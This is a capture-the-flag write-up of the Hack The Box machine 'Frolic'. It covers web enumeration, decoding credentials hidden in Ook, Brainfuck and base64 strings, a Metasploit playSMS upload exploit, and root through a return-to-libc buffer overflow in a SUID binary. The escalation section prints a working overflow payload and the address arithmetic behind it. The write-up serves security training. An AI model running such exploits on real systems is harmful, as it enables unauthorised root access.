# Frolic

### Basic Information
**Machine name:** Frolic  
**IP:** 10.10.10.111  
**Written by:** Adir Biran  
**Tools:** Nmap, Gobuster, fcrackzip, Metasploit, gdb  
**Method:** Enumerating the web services, gaining initial access by decoding and deciphering multiple strings accross the website.  
Exploitating a CVE with metasploit and escalating privileges to root user by a Return-to-libc buffer overflow technique.  


## Enumeration
#### Nmap

<p align="center">
<img width="383" alt="1" src="https://user-images.githubusercontent.com/21021400/144066027-972d9bb0-7c8f-4a14-b297-d86f77cc873d.png">
</p>

Open ports:  
22 - SSH  
139, 445 - SMB  
9999 - HTTP  

#### GoBuster

<p align="center">
<img width="371" alt="2" src="https://user-images.githubusercontent.com/21021400/144066032-49bf99cd-8127-4006-987b-334d47a087af.png">
</p>

Found endpoints:  
/admin  
/test  
/dev  
/backup  



/test  
<p align="center">
<img width="658" alt="4" src="https://user-images.githubusercontent.com/21021400/144066039-ea66cd98-ec94-4d38-95ad-65d9b535fdff.png">
</p>

/dev  
<p align="center">
<img width="475" alt="5" src="https://user-images.githubusercontent.com/21021400/144066043-80df91b3-6048-4176-9c54-9ef4110413c1.png">
</p>

Running gobuster on dev directory:  
<p align="center">
<img width="389" alt="2-2" src="https://user-images.githubusercontent.com/21021400/144066033-a08d0ed3-6a51-4f61-96ea-d4e0985421d0.png">
</p>

/dev/test  
<p align="center">
<img width="514" alt="5-2" src="https://user-images.githubusercontent.com/21021400/144066046-a2d40ea5-e878-43d6-8cdd-386839d6c9df.png">
</p>

/dev/backup  
<p align="center">
<img width="278" alt="5-3" src="https://user-images.githubusercontent.com/21021400/144066048-967631df-78e6-474c-917c-602b4b77d1c0.png">
</p>

Another endpoint found: /playsms  

/playsms  
<p align="center">
<img width="472" alt="5-4" src="https://user-images.githubusercontent.com/21021400/144066050-78b47328-6770-4856-a87e-705f64af4ae6.png">
</p>

/backup  
<p align="center">
<img width="282" alt="6" src="https://user-images.githubusercontent.com/21021400/144066051-df4bacd2-1a58-423a-8294-89d67acd655e.png">
</p>

/backup/user.txt  
<p align="center">
<img width="282" alt="7" src="https://user-images.githubusercontent.com/21021400/144066052-d318d3cb-6a33-4941-a313-d245ec1b3d62.png">
</p>

/backup/password.txt  
<p align="center">
<img width="321" alt="8" src="https://user-images.githubusercontent.com/21021400/144066053-f26cfec2-a790-4e34-8d20-dc6a6bebd106.png">
</p>

Credentials found:  
admin:imnothuman  

/admin  
<p align="center">
<img width="262" alt="3" src="https://user-images.githubusercontent.com/21021400/144066037-412e86cb-11f2-4bc8-890f-2ce4ce156730.png">
</p>

Source code:  
<p align="center">
<img width="271" alt="9" src="https://user-images.githubusercontent.com/21021400/144066055-467b2117-bfea-493c-a2f4-018baa85e2d6.png">
</p>

/js/login.js source code:  
<p align="center">
<img width="268" alt="10" src="https://user-images.githubusercontent.com/21021400/144066060-53a620b6-46f1-4161-9fc4-cd8b9fc0cfc4.png">
</p>

Credentials found:  
admin:superduperlooperpassword_lol  

After login to the admin page:  
<p align="center">
<img width="957" alt="11" src="https://user-images.githubusercontent.com/21021400/144066062-16796332-99b7-46f9-9b55-e9d925289ae0.png">
</p>

Researching google for that pattern lead to Ook programming language.  
Cipher was decoded using this website: https://www.dcode.fr/ook-language  
<p align="center">
<img width="588" alt="12" src="https://user-images.githubusercontent.com/21021400/144066063-592d5fb2-3edd-49ba-9883-a24e9a353635.png">
</p>

We get the results:  
Nothing here check /asdiSIAJJ0QWE9JAS  

Checking /asdiSIAJJ0QWE9JAS endpoint:  
<p align="center">
<img width="852" alt="13" src="https://user-images.githubusercontent.com/21021400/144066066-8a02c253-3a88-46c0-bf3a-65ae0baaee51.png">
</p>

Decoding the string with base64:  
<p align="center">
<img width="474" alt="14" src="https://user-images.githubusercontent.com/21021400/144066068-f9817724-56b4-41f7-80f0-f3a5d0f7b3b9.png">
</p>

This file represents a zip file.  
One method to check, is by the first 4 bytes of the file:  
<p align="center">
<img width="285" alt="15" src="https://user-images.githubusercontent.com/21021400/144066071-c7fdee44-6197-45da-a219-4a3f838c8100.png">
</p>

Searching google for file types with the bytes 50 4B 03 04 indicates it's a ZIP file.

Second method, is using the file command:  
<p align="center">
<img width="477" alt="16" src="https://user-images.githubusercontent.com/21021400/144066074-e4e5768c-6317-46b7-b64b-98c37150ed75.png">
</p>

The ZIP file is password protected, we will crack it using fcrackzip:  
<p align="center">
<img width="243" alt="17" src="https://user-images.githubusercontent.com/21021400/144066076-c2ed87ae-fe19-48f9-a8bc-58b75d1e82de.png">
</p>

The password is "password".  

Unzip the content:  
<p align="center">
<img width="123" alt="18" src="https://user-images.githubusercontent.com/21021400/144066077-75746f82-abb5-43f4-a48b-8607e17495f6.png">
</p>

index.php file content:  
<p align="center">
<img width="476" alt="19" src="https://user-images.githubusercontent.com/21021400/144066081-3afa0879-d98d-48d7-8e32-b88c593bdcca.png">
</p>

Converting the Hex content to ASCII on https://www.rapidtables.com/convert/number/hex-to-ascii.html:  
<p align="center">
<img width="463" alt="20" src="https://user-images.githubusercontent.com/21021400/144066082-28edcd11-61d8-40ae-a6de-477d9a8ce7f2.png">
</p>

Looks like another base64 encoded string.  
Decoding it:  
<p align="center">
<img width="474" alt="21" src="https://user-images.githubusercontent.com/21021400/144066085-51a10ec7-7cb6-456b-a25d-0d328c61c824.png">
</p>

By looking at the pattern and from previous machine, it looks like a Brainfuck cipher.  
lets try to decode it on https://www.dcode.fr/brainfuck-language:  
<p align="center">
<img width="584" alt="22" src="https://user-images.githubusercontent.com/21021400/144066088-8b16d5e0-f582-4dfb-9101-eab3c9e50bb7.png">
</p>

We get what seems to be a password, "idkwhatispass".  

Lets get back to the /playsms login page and try those credentials:  
admin:idkwhatispass  

## Exploitation

Once we're in, we can check Metasploit for authenticated exploits:  
<p align="center">
<img width="638" alt="23" src="https://user-images.githubusercontent.com/21021400/144066090-180b0664-7f5c-4ed3-b842-6f95b726bf5f.png">
</p>

Let's try the first exploit:  
exploit/multi/http/playsms_uploadcsv_exec  

After setting the following options and running the exploit, we get a meterpreter shell as www-data:
<p align="center">
<img width="420" alt="24" src="https://user-images.githubusercontent.com/21021400/144066092-21162197-683c-4f3c-8d2a-bd805fb327bc.png">
</p>

## Privilege Escalation (www-data -> root)

On the machine we have 2 users besides root:  
sahay  
ayush  

<p align="center">
<img width="341" alt="25" src="https://user-images.githubusercontent.com/21021400/144066095-dbf1f8de-1cae-4102-960a-668b53789cab.png">
</p>

Inside ayush home directory, we can fine the user.txt file with an interesting directory ".binary".  
<p align="center">
<img width="230" alt="26" src="https://user-images.githubusercontent.com/21021400/144066100-7d83e203-7291-42d1-b5b2-6e9c69b63f36.png">
</p>

Inside .binary, we have an executable file named rop, owned by root with a SUID bit.  
<p align="center">
<img width="490" alt="27" src="https://user-images.githubusercontent.com/21021400/144066102-a587ed6e-19dc-46c2-a69b-dfb57b4c8c44.png">
</p>

Playing a bit with the file, we can see it receives an input and prints to the terminal.  
Giving the program a long string, will cause in a segmentation fault.  
<p align="center">
<img width="496" alt="28" src="https://user-images.githubusercontent.com/21021400/144066104-8b0d7b37-75cb-4182-866a-62ec9c17e078.png">
</p>

Let's try buffer overflow:

First, we will need gdb on the victim's machine.  
Downloaded it from https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32  
and moved it to the machine using Python simple server.  
<p align="center">
<img width="750" alt="29" src="https://user-images.githubusercontent.com/21021400/144066105-ebdee800-4e71-4eda-95f8-96a4be6b87f2.png">
</p>

Launching the rop program with gdb:  
<p align="center">
<img width="319" alt="30" src="https://user-images.githubusercontent.com/21021400/144066110-0a535d9f-11ee-43c8-a943-774b024b1c7f.png">
</p>

Let's find the EIP offset by creating a large non repeating string which will lead to a segmentation fault.  

On the attacker's machine:  
**./pattern_create.rb -l 100**  
<p align="center">
<img width="412" alt="31" src="https://user-images.githubusercontent.com/21021400/144066117-e2472c9f-9a33-4d8a-b1b4-72a60a9c5d58.png">
</p>

Taking that string as input to the rop program inside gdb:  
<p align="center">
<img width="471" alt="32" src="https://user-images.githubusercontent.com/21021400/144066120-a226e691-c230-4798-a943-9f72513ff002.png">
</p>

We get the following address:  
0x62413762  

Searching the offset for that address:  
**./pattern_offset.rb -q 62413762 -l 100**  
<p align="center">
<img width="174" alt="33" src="https://user-images.githubusercontent.com/21021400/144066123-941f5770-6d5f-4b25-959b-7f3380ac1d71.png">
</p>

We get the offset 52  

To confirm that, lets try a string of 52 A' and 4 B':  
<p align="center">
<img width="319" alt="34" src="https://user-images.githubusercontent.com/21021400/144066126-8275a748-2b52-457d-ae81-23ae29ffd9e8.png">
</p>

We get the address 0x42424242 which confirms we can overwrite the return address.  

The buffer overflow in this case is "Return-to-libc", we will use functions from libc library.  
First, we need to find the address of libc by using the command:  
**ldd rop**  
<p align="center">
<img width="256" alt="35" src="https://user-images.githubusercontent.com/21021400/144066128-27a63df7-d02b-44d4-bb1e-9fe1f69ef21a.png">
</p>

libc base address: 0xb7e19000  

Get system address:  
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system**  
<p align="center">
<img width="370" alt="36" src="https://user-images.githubusercontent.com/21021400/144066131-42fec910-7581-4028-a224-eb371afc793b.png">
</p>

system address: 0x0003ada0  

Get exit address:  
**readelf -Ws /lib/i386-linux-gnu/libc.so.6 | grep exit**  
<p align="center">
<img width="366" alt="37" src="https://user-images.githubusercontent.com/21021400/144066132-dfcf483f-3259-4408-8387-50fb9fafd28f.png">
</p>

exit address: 0x0002e9d0  

Last thing we need is to find the offset to /bin/sh inside libc using the command:  
**strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh**  
<p align="center">
<img width="384" alt="38" src="https://user-images.githubusercontent.com/21021400/144066135-3155223d-5e4d-421a-b541-ee2b08ebc314.png">
</p>

/bin/sh address: 0x0015ba0b  


Calculating fixed addresses from the libc base address:  
<p align="center">
<img width="255" alt="39" src="https://user-images.githubusercontent.com/21021400/144066138-44ec634a-2de7-4d9f-acd2-0047463b02fc.png">
</p>

system  
**python -c "print('system', hex(0xb7e19000 + 0x0003ada0))"**  
0xb7e53da0  

exit  
**python -c "print('exit', hex(0xb7e19000 + 0x0002e9d0))"**  
0xb7e479d0  

/bin/sh  
**python -c "print('/bin/sh', hex(0xb7e19000 + 0x0015ba0b))"**  
0xb7f74a0b  

Our payload is: Buffer + Address_of_System + Address_of_Exit + Address_of_/bin/sh  

Converting the final addresses to our payload:  
System: 0xb7e53da0 => \xa0\x3d\xe5\xb7  
Exit: 0xb7e479d0 => \xd0\x79\xe4\xb7  
/bin/sh: 0xb7f74a0b => \x0b\x4a\xf7\xb7  


The final payload to the rop program:  
./rop $(python -c 'print("A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')  
<p align="center">
<img width="538" alt="40" src="https://user-images.githubusercontent.com/21021400/144066140-dabc3037-14aa-449a-829d-cc99e3f7cb24.png">
</p>

and we're root
